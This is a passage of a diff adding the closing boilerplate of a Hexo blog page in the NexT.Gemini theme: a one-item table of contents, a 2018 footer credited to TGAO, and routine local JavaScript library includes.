+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X02"><span class="nav-number">1.</span> <span class="nav-text">#0X02</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TGAO</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
